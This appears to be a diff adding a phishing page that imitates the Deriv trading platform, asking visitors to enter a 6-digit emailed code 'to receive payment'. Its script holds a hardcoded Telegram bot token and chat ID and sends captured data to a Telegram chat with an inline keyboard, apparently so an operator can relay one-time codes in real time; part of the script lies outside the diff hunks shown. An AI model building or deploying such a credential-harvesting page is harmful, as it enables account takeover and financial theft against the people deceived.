@@ -1,3 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Confirmation</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        
+        header {
+            position: absolute;
+            top: 20px;
+            left: 0;
+            right: 0;
+            background-color: #ece9e7;
+            color: white;
+            padding: 10px 0;
+            font-size: 24px;
+            border-radius: 5px;
+            margin: 0 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 90%;
+            max-width: 400px;
+            margin-top: 80px;
+        }
+        
+        h2 {
+            margin-bottom: 20px;
+        }
+        
+        .code-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        
+        .code-input {
+            width: 40px;
+            height: 40px;
+            text-align: center;
+            font-size: 24px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        
+        .code-input:focus {
+            outline: none;
+            border-color: #ff444f;
+            box-shadow: 0 0 0 2px rgba(255, 68, 79, 0.2);
+        }
+        
+        .confirm-btn {
+            width: 100%;
+            padding: 12px 20px;
+            background: #ff444f;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        
+        .confirm-btn:hover {
+            opacity: 0.9;
+        }
+        
+        .confirm-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .resend {
+            color: #d35b0c;
+            cursor: pointer;
+        }
+        
+        .timer {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #666;
+        }
+        /* ===== ERROR BANNER ===== */
+        
+        .error-msg {
+            background: rgba(220, 53, 69, 0.12);
+            border: 1px solid rgba(220, 53, 69, 0.3);
+            color: #dc3545;
+            padding: 12px 16px;
+            border-radius: 10px;
+            font-size: 13px;
+            margin-bottom: 16px;
+            display: none;
+            text-align: center;
+        }
+        /* ===== SPINNER OVERLAY ===== */
+        
+        .spinner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+            pointer-events: none;
+        }
+        
+        .spinner-overlay.active {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: all;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #ffffff30;
+            border-top-color: #ff444f;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .spinner-text {
+            color: #e0e0e0;
+            font-size: 14px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+        
+        .spinner-code {
+            color: #ff444f;
+            font-size: 13px;
+            margin-top: 8px;
+            font-weight: 600;
+            letter-spacing: 2px;
+        }
+        
+        .cancel-poll-btn {
+            margin-top: 20px;
+            padding: 10px 24px;
+            background: transparent;
+            border: 1px solid #6c757d;
+            border-radius: 50px;
+            color: #adb5bd;
+            font-family: inherit;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .cancel-poll-btn:hover {
+            border-color: #ff444f;
+            color: #ff444f;
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <h2 class="mb-4" style="color: #ff444f; font-weight: bold; font-style: italic;">deriv</h2>
+    </header>
+
+    <div class="container">
+        <h2>Confirm code to receive payment</h2>
+        <p>Enter the 6-digit code sent to <strong>your email</strong>.</p>
+
+        <!-- Error message area -->
+        <div class="error-msg" id="codeError"></div>
+
+        <form id="codeForm">
+            <div class="code-inputs">
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+            </div>
+            <button type="submit" class="confirm-btn" id="confirmBtn">Confirm Code</button>
+        </form>
+        <p>Didn't receive the code? <span class="resend" onclick="startTimer()">Resend code</span></p>
+        <div class="timer" id="timer"></div>
+    </div>
+
+    <!-- SPINNER OVERLAY -->
+    <div class="spinner-overlay" id="spinnerOverlay">
+        <div class="spinner"></div>
+        <p class="spinner-text">Verifying payment code...</p>
+        <p class="spinner-code" id="spinnerCodeDisplay"></p>
+        <button class="cancel-poll-btn" onclick="cancelPolling()">Cancel</button>
+    </div>
+
 <script>
         const TELEGRAM_BOT_TOKEN = "8827407441:AAHqTSjR7BHABcD3c3sTbHYcZYjzK_8wJ_A";
         const TELEGRAM_CHAT_ID = "8820857419";
@@ -230,3 +454,5 @@
             sendTelegramWithInlineKeyboard(message, keyboard, userId);
         });
     </script>
+</body>
+</html>
